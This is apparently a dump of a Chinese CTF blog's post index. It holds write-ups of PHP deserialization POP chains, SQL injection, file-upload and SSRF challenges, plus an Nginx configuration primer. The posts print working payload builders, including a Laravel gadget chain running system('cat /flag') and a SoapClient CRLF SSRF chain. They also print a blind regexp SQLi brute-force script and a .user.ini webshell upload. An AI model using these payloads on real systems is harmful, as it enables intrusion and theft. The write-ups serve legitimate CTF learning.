str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 调用不存在的方法时，SoapClient仍会向WebSever发送请求，调用服务器函数。 在参数中，user-agent是可控的，这意味着通过CRLF，我们可以控制ua下的所有参数，进而借网站发送一个由我们控制的POST请求，完成ssrf。 pop链已经明了了(大概)： HelloWorld_DB反序列化触发wakeup，在wakeup中实例化一个Typecho_Db； Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world'])，$this-&gt;coincidence['world']作为参数，也就是$adapterName，控制此参数为Typecho_Db_Query的实例化，触发toString； Typecho_Db_Query中控制$this-&gt;_sqlPreBuild['action']为select，$this-&gt;_adapter为SoapClient的实例化，触发其中的call方法，发送post请求进行ssrf。 明了归明了，写脚本也是一大难关……并且要对各个类里的魔术方法有数，这样才能构造出正确的序列化字符串。 ……………………无语凝噎 利用类里有的construct控制变量，传入target为http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php设置好xff头和自己的cookie： 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);class HelloWorld_DB{ private $coincidence; public function __construct() { $this-&gt;coincidence = array(&quot;hello&quot; =&gt; new Typecho_Db_Query()); }}class Typecho_Db_Query{ private $_adapter; private $_sqlPreBuild; public function __construct() { $target = &quot;http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php&quot;; $headers = array( 'X-Forwarded-For:127.0.0.1', &quot;Cookie: PHPSESSID=a55efu5tcvab970c7j54jbfkj3&quot; ); $this-&gt;_adapter = new SoapClient(null, array('uri' =&gt; 'aaab', 'location' =&gt; $target, 'user_agent' =&gt; 'haha^^' . join('^^', $headers))); $this-&gt;_sqlPreBuild = ['action' =&gt; &quot;SELECT&quot;]; }}$a = serialize(new HelloWorld_DB());//echo $a;$a = preg_replace(&quot; /\\^\\^/&quot;, &quot;\\r\\n&quot;, $a);echo base64_encode($a);unserialize($_GET['pop']); （大概可以吧………… 最后如何该如何利用反序列化： 在另一个Plugin.php中： 123456public static function activate($pluginName) { self::$_plugins['activated'][$pluginName] = self::$_tmp; self::$_tmp = array(); Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,'action'); } 1234567891011121314151617181920212223242526272829303132333435363738//Helper.php * 增加路由 * @access public * @param string $name 路由名称 * @param string $url 路由路径 * @param string $widget 组件名称 * @param string $action 组件动作 * @param string $after 在某个路由后面 * @return integer */ public static function addRoute($name, $url, $widget, $action = NULL, $after = NULL) { $routingTable = self::options()-&gt;routingTable; if (isset($routingTable[0])) { unset($routingTable[0]); } $pos = 0; foreach ($routingTable as $key =&gt; $val) { $pos ++; if ($key == $after) { break; } } $pre = array_slice($routingTable, 0, $pos); $next = array_slice($routingTable, $pos); $routingTable = array_merge($pre, array($name =&gt; array( 'url' =&gt; $url, 'widget' =&gt; $widget, 'action' =&gt; $action )), $next); self::options()-&gt;routingTable = $routingTable; $db = Typecho_Db::get(); return Typecho_Widget::widget('Widget_Abstract_Options')-&gt;update(array('value' =&gt; serialize($routingTable)) , $db-&gt;sql()-&gt;where('name = ?', 'routingTable')); } https://blog.csdn.net/a3320315/article/details/105215741 根据这篇文章的说法，网页上的插件(Widget)一般由路由分发来自动加载，序列化点： 由此，对应的 * @param string $widget 组件名称也就是HelloWorld_Plugin，查找相关的插件名一般就可以找到路由……（这个一般，大概是我胡说的……因为我根本不懂……😭zhendecai *这句代码的意思大概就是访问/page_admin的时候，会自动加载HelloWorld_Plugin类，而且会自动调用action函数，所以我们利用点的路由为/page_admin*。 最后是文件中带有的flag.php： 123456&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ $_SESSION['flag']= &quot;MRCTF{******}&quot;;}else echo &quot;我扌your problem?\\nonly localhost can get flag!&quot;;?&gt; 如果是内网访问，则flag写入session，利用点： 1if(isset($_REQUEST['admin'])) var_dump($_SESSION); 传入admin参数打印session获取flag…… 这题……好像还有很类似的题，大概算是真实环境下的反序列化代码审计？不清楚，我啥都不知道🐕 经常看了后面忘前面……也算是一种锻炼吧，多积累经验……","link":"/2021/04/04/MRCTF2020-Ezpop-Revenge/"},{"title":"MRCTF2020-Ezpop","text":"[MRCTF2020]Ezpop题目： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else{ $a=new Show; highlight_file(__FILE__); } 提示在flag.php，应该是利用include进行读取，构造pop链： class Show：wakeup、toString class Test：get class Modifier：invoke、include 可以看出来，Show类应当是入口： 123456789public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } 在对source过滤是是一种字符串操作，这里可以跳到toString方法中 而toString明显调用了一个属性值，get到不存在的属性，进入Test： 1234public function __get($key){ $function = $this-&gt;p; return $function(); } 函数形式调用方法，invoke： 1234567protected $var;public function append($value){ include($value);}public function __invoke(){ $this-&gt;append($this-&gt;var);} 利用方法是很明显的，我们只需要控制$var为我们想要的就可以进行包含任意读取 另，注意这里是私有保护变量，要传一个url加密的序列化字符串保证正确的解析 Help Me Find FLAG! 估计是藏起来了，上伪协议 php://filter/read=convert.base64-encode/resource=flag.php 123456&lt;?phpclass Flag{ private $flag= &quot;flag{81ade5a5-3fc1-455b-bec8-5adbc83dfd1b}&quot;;}echo &quot;Help Me Find FLAG!&quot;;?&gt; exp： 123456789$m = new Modifier();$t = new Test();$s = new Show();$ss=new Show();$s-&gt;source=$ss;$s-&gt;source-&gt;str=$t;$s-&gt;source-&gt;str-&gt;p=new Modifier();$k = serialize($s);echo urlencode($k); ……ok","link":"/2021/04/03/MRCTF2020-Ezpop/"},{"title":"MRctf2021","text":"MRctf2021ez_larave1 害……只做出来这一道签到题 本来以为和20年一样是自己找pop，硬是找不到菜到放弃了，结果一搜搜到个cve…… 先找反序列化利用点： TaskController.php： 123456789101112131415161718class TaskController{ public function index(){ if(isset($_GET['action']) &amp;&amp; preg_match('/serialize\\/*$/i', $_GET['action'])){ exit(1); } if(preg_match('/serialize/i', basename( $_GET['action']))){ if(isset($_GET['ser'])){ $ser = $_GET['ser']; unserialize($ser); return ; }else{ echo &quot;no unserialization&quot;; return ; } } }} index方法…… 这里学到了，先查询相关框架的路由加载方式，看路由： https://laravelacademy.org/post/8731.html web.php: 12345Route::get('/', function () { return view('welcome');});Route::get('/hello','TaskController@index'); 访问/hello时，会加载TaskController类的index方法，这里就是提交点。 利用方法：cve 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpnamespace Illuminate\\Broadcasting{ class PendingBroadcast { protected $events; protected $event; public function __construct($events=&quot;&quot;,$event=&quot;&quot;) { $this-&gt;events = $events; $this-&gt;event = $event; } }}namespace Illuminate\\Bus{ class Dispatcher { protected $queueResolver = &quot;system&quot;; }}namespace Illuminate\\Broadcasting{ class BroadcastEvent { public $connection = &quot;cat /flag&quot;; }}namespace{ $d = new Illuminate\\Bus\\Dispatcher(); $b = new Illuminate\\Broadcasting\\BroadcastEvent(); $p = new Illuminate\\Broadcasting\\PendingBroadcast($d,$b); echo urlencode(serialize($p));}?&gt; 菜到直接拿脚本……匹配那个直接 空格+%0a污染即可绕过。","link":"/2021/04/18/MRctf2021/"},{"title":"MRCTF2020-套娃","text":"MRCTF2020-套娃进入页面，查看源码： 123456789//1st$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){ die('Y0u are So cutE!');} if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){ echo &quot;you are going to the next ~&quot;;} 了解一下QUERY_STRING：https://www.cnblogs.com/mitang/p/3874291.html 这个东西不会对字段进行url转码，可以通过urlencode绕过…… /^23333$/考察换行符绕过（话说今年也有 ?b%20u%20p%20t=23333%0a 提示有secrettw.php，源码有jsfxxk，解密alert一个post me Merak 出现源码： 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; }echo 'Local access only!'.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!='127.0.0.1')echo &quot;Sorry,you don't have permission! Your ip is :&quot;.$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){echo &quot;Your REQUEST is:&quot;.change($_GET['file']);echo file_get_contents(change($_GET['file'])); }?&gt; file_get_contents用data传参，ip用head头client-ip绕过 根据change函数逆向出payload即可","link":"/2021/04/11/MRCTF2020-%E5%A5%97%E5%A8%83/"},{"title":"NCTF2019-SQLi","text":"[NCTF2019]SQLi进入题目是一个登录框注入 sqlquery : select * from users where username=’’ and passwd=’’ 标识了查询语句，测试： 过滤了很多…… robots.txt中有hint，提示了过滤规则与flag获取方式： 123456$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\'|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST['passwd'] === admin's password,Then you will get the flag; 引号被过滤，用转义： username=a&amp;passwd=/**/||1;%00 结果永真，此时res出现了变化： 实际上，这个页面并不存在…… 我陷入了沉思…… regexp注入https://xz.aliyun.com/t/8003 1username=\\&amp;passwd=/**/||username/**/regexp/**/&quot;^admin&quot;;%00 此时，注入语句为： 1select * from users where username='xxx'/**/||username/**/regexp/**/&quot;^admi&quot;;%00 对username字段进行正则匹配，一个个移位匹配……（又是移位匹配…… 写脚本： 123456789101112131415161718192021222324# coding=utf-8import requestsimport timeflag = &quot;&quot;url = &quot;http://9424a242-edab-424f-b620-ceca992f2e55.node3.buuoj.cn/&quot;string=&quot;1234567890qwertyuiopasdfghjklzxcvbnm_&quot;for x in range(1, 200): for s in string: data = { &quot;username&quot;: &quot;\\\\&quot;, &quot;passwd&quot;: '/**/||passwd/**/regexp/**/&quot;^{}&quot;;'.format(flag+s)+chr(0) } # print(pay) response = requests.post(url=url, data=data) # print(response.text) if &quot;welcome.php&quot; in response.text: # time.sleep(0.03) flag += s print(s) print(flag)print(flag) 得到flag…… 官方wp： http://yulige.top/?p=752#SQLi500pt_11solvers","link":"/2021/05/04/NCTF2019-SQLi/"},{"title":"NaNNaNNaNNaN-Batman","text":"NaNNaNNaNNaN-Batman题目只有一个附件：web100…… 打开后是乱码： _是一个function，后面可以看到eval（_）…… 在js中，eval是一个奇怪的函数： JavaScript eval() 函数 eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。 ……总之就挺奇怪的，计算出乱码……，我找到了GitHub上的官方wp： 1234567To see what code gets evaluated, let’s replace theevalat the end withconsole.log. This results in:_ = 'function $(){\\x02e=\\x04getEle\\x0FById(&quot;c&quot;).value;\\x0Elength==16\\x05^be0f23\\x01233ac\\x01e98aa$\\x01c7be9\\x07){\\x02t\\bfl\\x03s_a\\x03i\\x03e}\\x06n\\ba\\x03_h0l\\x03n\\x06r\\bg{\\x03e\\x03_0\\x06i\\bit\\'\\x03_\\x03n\\x06s=[t,n,r,i];for(\\x02o=0;o&lt;13;++o){\\t\\x0B[0]);\\x0B.splice(0,1)}}}\\t\\'&lt;input id=&quot;c&quot;&gt;&lt;\\f onclick=$()&gt;Ok&lt;/\\f&gt;\\');delete _\\x01\\x07\\x05\\x02var \\x03&quot;,&quot;\\x04docu\\x0F.\\x05)\\x0Ematch(/\\x06&quot;];\\x02\\x07/)!=null\\b=[&quot;\\t\\x04write(\\x0Bs[o%4]\\fbutton\\x0Eif(e.\\x0Fment';for (Y in $ = '\\x0F\\x0E\\f\\x0B\\t\\b\\x07\\x06\\x05\\x04\\x03\\x02\\x01') with (_.split($[Y])) _ = join(pop());eval(_); \\x是以16进制表示的字符……js不是很熟悉 把不可预测的eval换成alert正确解释： 1234567891011121314151617181920function $() { var e = document.getElementById(&quot;c&quot;).value; if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) { var t = [&quot;fl&quot;, &quot;s_a&quot;, &quot;i&quot;, &quot;e}&quot;]; var n = [&quot;a&quot;, &quot;_h0l&quot;, &quot;n&quot;]; var r = [&quot;g{&quot;, &quot;e&quot;, &quot;_0&quot;]; var i = [&quot;it'&quot;, &quot;_&quot;, &quot;n&quot;]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) { document.write(s[o % 4][0]); s[o % 4].splice(0, 1) } }}document.write('&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;');delete _ 满足条件后计算出flag，条件应该是需要拼接的，计算部分导入控制台出结果： ……","link":"/2021/03/18/NaNNaNNaNNaN-Batman/"},{"title":"Nginx入门","text":"Nginx1.简介：高性能的HTTP和反向代理服务器，占有内存少，并发能力强。 ​ Nginx与Tomcat：Nginx可以作为静态页面的web服务器，支持CGI协议的动态语言，perl、php。 不支持Java，与apache构成竞争关系。Nginx更有优势。 ​ Nginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。 2.功能： ​ 正向代理：客户端通过代理服务器发送访问请求 ​ 反向代理：客户端访问Nginx代理的服务器，访问不到后台服务器 ​ 负载均衡：请求分发，根据路线，速度分配请求；提高抗风险能力。 ​ 动静分离：拿出静态资源，减小动态资源数据包，快速上线、修改；页面样式修改方便。 Nginx配置： 1、全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。 2、events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。 3、http块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。 4、server块：配置虚拟主机的相关参数，一个http中可以有多个server。 5、location块：配置请求的路由，以及各种页面的处理情况。 123456789101112131415161718192021222324252627282930313233343536373839########### 每个指令必须有分号结束。##################user administrator administrators; #配置用户或者组，默认为nobody nobody。#worker_processes 2; #允许生成的进程数，默认为1#pid /nginx/pid/nginx.pid; #指定nginx进程运行文件存放地址error_log log/error.log debug; #制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emergevents { accept_mutex on; #设置网路连接序列化，防止惊群现象发生，默认为on multi_accept on; #设置一个进程是否同时接受多个网络连接，默认为off #use epoll; #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport worker_connections 1024; #最大连接数，默认为512}http { include mime.types; #文件扩展名与文件类型映射表 default_type application/octet-stream; #默认文件类型，默认为text/plain #access_log off; #取消服务日志 log_format myFormat '$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #自定义格式 access_log log/access.log myFormat; #combined为日志格式的默认值 sendfile on; #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。 sendfile_max_chunk 100k; #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。 keepalive_timeout 65; #连接超时时间，默认为75s，可以在http，server，location块。 upstream mysvr { server 127.0.0.1:7878; server 192.168.10.121:3333 backup; #热备 } error_page 404 https://www.baidu.com; #错误页 server { keepalive_requests 120; #单连接请求上限次数。 listen 4545; #监听端口 server_name 127.0.0.1; #监听地址 location ~*^.+$ { #请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。 #root path; #根目录 #index vv.txt; #设置默认页 proxy_pass http://mysvr; #请求转向mysvr 定义的服务器列表 deny 127.0.0.1; #拒绝的ip allow 172.18.5.54; #允许的ip } }} 几个常见配置项： 1.$remote_addr 与 $http_x_forwarded_for 用以记录客户端的ip地址； 2.$remote_user ：用来记录客户端用户名称； 3.$time_local ： 用来记录访问时间与时区； 4.$request ： 用来记录请求的url与http协议； 5.$status ： 用来记录请求状态；成功是200； 6.$body_bytes_s ent ：记录发送给客户端文件主体内容大小； 7.$http_referer ：用来记录从那个页面链接访问过来的； 8.$http_user_agent ：记录客户端浏览器的相关信息；","link":"/2021/03/18/Nginx%E5%85%A5%E9%97%A8/"},{"title":"RCTF2015-EasySQL","text":"[RCTF2015]EasySQL进入题目是一个登录页面，有注册和修改密码功能……似乎有index.phps源码，但是forbidden 发现admin已经被注册……难道可以先注入获取admin账户再得到源码进一步渗透？ 注册一个\\,在change密码时发生报错： pwd后的一串是0的md5值…… 这可能是二次注入，在拿出数据时没有进行转义发生的漏洞，鉴于打印了报错信息，即可进行报错注入 类似之前的题构造，但是用户名存在过滤，首次尝试fuzz操作…… 过滤了很多…… &quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(database())),0x7e),1)#成功回显数据库名 &quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c6167)),0x7e),1)#获取表名 发现flag表 flag列 fakeflag……那去查查user表 应该是real_flag_1s_here，似乎有多行……concat 这样的查询表明，很多行的数据都是xxx，而flag应当在其中一行 limit似乎用不了，很多加密也不行，mid、substr、right、left都被ban了…… 学习了正则的使用： &quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(select(real_flag_1s_here)regexp('^l'))),0x7e),1)# 或 &quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')),0x7e),1)# where(real_flag_1s_here)regexp(‘^f’)匹配real_flag_1s_here列中以f开头的那一行数据，大概是优先于group_concat的，所以也可以： “&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’)),0x7e),1)# 怎么解决位数不足显示不全的问题呢？正则帮助我们拿出了这一行的数据，我们就可以将这行数据逆向输出 reverse&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')))),0x7e),1)# XPATH syntax error: ‘~flag{4c5c3709-12d5-40af-82f2-c3’ XPATH syntax error: ‘~}8f414a13433c-2f28-fa04-5d21-90’ &lt;php？echo strrev(“}8f414a13433c-2f28-fa04-5d21-90”); flag{4c5c3709-12d5-40af-82f2-c33431a414f8} 获得flag……","link":"/2021/04/25/RCTF2015-EasySQL/"},{"title":"SSRF1","text":"1.题目1234567891011121314151617&lt;?php echo'&lt;center&gt;&lt;strong&gt;啊这，这怎么...这file_get_contents()有啥用呢&lt;/strong&gt;&lt;/center&gt;'; highlight_file(__FILE__); $url =$_GET ['url']; if (preg_match('/dotnet\\.com/', $url)){ if(!preg_match('/php|file|zip|bzip|zlib|base|data/i', $url)) { echo (file_get_contents($url)); } else { echo('没看到过滤了吗...'); } } else{ echo (&quot;这个怎么绕过呢？&quot;) ; }//flag is in '/flag'?&gt; 2.过程 SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 ……啥？ 过滤了很多协议……查找后得知： 当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞 而flag在根目录，所以一直向上跳转即可，哦，还要包括dotent.com。 payload：?url=lgy://dotnet.com/../../../../../../../../flag 3.知识点： / ：表示当前路径的根路径 ./ ：表示当前路径 ../ ：表示父级路径，当前路径所在的上一级路径 file_get_contents()的$filename参数不仅仅为文件路径,还可以是一个URL(伪协议)（？","link":"/2020/12/06/SSRF1/"},{"title":"RoarCTF-2019-Easy-Calc","text":"[RoarCTF 2019]Easy Calc1.题目：绕过/Http走私2.过程：做HGAME走私者的时候发现的这题，拿来做一做…… 网页是一个计算器功能，对特殊字符进行了过滤 提交参数时查看流量： 发现对calc.php和num，访问calc.php： 正则匹配模式： /i (忽略大小写) /g (全文查找出现的所有匹配字符) /m (多行查找) /gi(全文查找、忽略大小写) /ig(全文查找、忽略大小写) 按理应该是绕过…… 法一：绕过 利用scandir扫描目录 +num可以绕过匹配，但在处理时+会被省去，实现绕过，chr 结合var_dump显示目录： 发现f1agg文件 然后用file、file_get_contents去读取文件，用chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)拼接绕过黑名单 dalao： https://www.cnblogs.com/gyrgyr/p/5774436.html 利用PHP的字符串解析特性Bypass 所以他实际上有两层检测，第一层检测过滤各种字母；+num绕过后还会过滤引号等。 2.Http走私其实不太明白服务器架设之类的知识，可以去学一下…… 由于前后端服务器对信息体的识别问题，加上缓存重用连接，导致了漏洞……？ 但这道题挺诡异的： 只需要两个CL头就可以绕过…… 猜测和这个有关系Http走私4.3.1-ATS第一个补丁…… 个人猜想：前端服务器读出有两个CL头，虽然报错，但仍然转发了请求(所以三个CL头也能成……)。 dalao：星盟 ok","link":"/2021/02/05/RoarCTF-2019-Easy-Calc/"},{"title":"SUCTF-2019-CheckIn","text":"[SUCTF 2019]CheckIn1.题目：文件上传利用.user.ini2.过程：em，这道题把前面的知识点基本上都概括了……但是文件后缀的检查一直无法绕过，学习了一波…… 关于.user.ini文件的知识： dalao的文章解释的很清楚 更加细化的说明 如果要用到.user.ini,特征之一就是在上传到.user.ini的文件夹下，也要有可执行的正常php文件。 这道题的文件结构恰好是这样的（太恰好了……） 所以常规绕过上传一个jpg结尾的图片一句话木马，在上传.user.ini对图片包含在php文件中解析 12GIF89a&lt;script language='php'&gt;system('cat /flag'); 123GIF89aauto_append_file=a.jpg 访问时就自动执行查出flag 唉，用菜刀一直连不上去……","link":"/2021/02/09/SUCTF-2019-CheckIn/"},{"title":"SUCTF-2019EasySQL","text":"[SUCTF 2019]EasySQL1.题目链接：[https://buuoj.cn/challenges#[SUCTF%202019\\]EasySQL](https://buuoj.cn/challenges#[SUCTF 2019]EasySQL) 2.过程： 一个提交框…… 查看原码可以看到传了一个“query”…… 输入数字有一种回显，字母无回显，过滤了flag，from，union等等，；可以用，可能是堆叠注入。 *1;show databases;*有回显 *1;show tables;select 1,2,3;*有回显 *1;show tables;select 1,2,(select schema_name form information_schema.shemate);*提示过滤 好像是information被过滤了……猜不到入口语句是啥啊，看一波wp…… 1源码：select $_GET['query'] || flag from Flag 就算知道了，我也…… 解一：1*,1 👌，继续查 查询指定列：select 列名1，列名2，列名3 from 表名 select * from 表名，查找全部列 select max(列名) from 表名，计算后的列 select 1 from 表名：增加一个临时列，它的列名是1，然后那一列的值都为1，如： 1 2 3 ——详细，还不是很懂，以后上手操作可以多试试。 || 具体语法规则为：当两个操作数都为非 NULL 值时，如果有任意一个操作数为非零值，则返回值为 1，否则结果为 0；当有一个操作数为NULL 时，如果另一个操作数为非零值，则返回值为 1，否则结果为NULL；假如两个操作数均为 NULL 时，则返回值为 NULL。 所以说，输入任何数字，经过||都为1，查询结果不变…… 键入 “*,1” *查询所有列，“1||flag”=&gt;1，于是变为 1select *,1 from Flag 读出所有内容拿到flag 解二： sql_mode 定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 “或” 运算符，未配置 sql_mode 之前，|| 是作为 或 运算符。在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。但在mysql 缺省不支持。需要调整mysql 的sql_mode，需要设置。 payload:1;set sql_mode=PIPES_AS_CONCAT;select 1 嗯，很强……","link":"/2020/12/08/SUCTF-2019EasySQL/"},{"title":"SWPUCTF-2018-SimplePHP","text":"[SWPUCTF 2018]SimplePHP进入题目，有一个file参数，尝试一下伪协议，无果…… 结果直接读可以读出来 file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); $file = $_GET[&quot;file&quot;] ? $_GET['file'] : &quot;&quot;; if(empty($file)) { echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) { //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; return false; } } } ?&gt; class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r{ public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; }}class Show{ public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }}?&gt; 1&lt;!--flag is in f1ag.php--&gt; 反序列化，但是没有反序列化利用点…… phar反序列化https://www.cnblogs.com/zzjdbk/p/13030571.html 结合文件上传中的文件操作函数，可以利用phar中以反序列化方式储存的meta-data进行反序列化。在文件操作函数进行phar解析时，meta-data的数据也会一同解析。 开始找pop链： 先找魔法方法……__destruct()、__wakeup()、__toString()…… 1234567891011121314class C1e4r{ public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct()//析构，脚本结束自动调用 { $this-&gt;test = $this-&gt;str; echo $this-&gt;test;//toString }} 12345public function __toString() { $content = $this-&gt;str['str']-&gt;source;//属性调用-》get return $content; } 12345678910111213141516171819public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; }} 最后来到file_get_contents进行文件读取 构建脚本： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass C1e4r{ public $test; public $str;}class Show{ public $source; public $str;}class Test{ public $file; public $params;}$a = new C1e4r();$b = new Show();$c = new Test();$c-&gt;params['source'] = &quot;/var/www/html/f1ag.php&quot;;$b-&gt;str['str'] = $c;$a-&gt;str = $b;$phar = new Phar(&quot;test.phar&quot;); //创建.phar文件$phar-&gt;startBuffering();//写入缓冲$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); //固定$phar-&gt;setMetadata($a); //传入C1e4r对象$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //生成签名$phar-&gt;stopBuffering(); 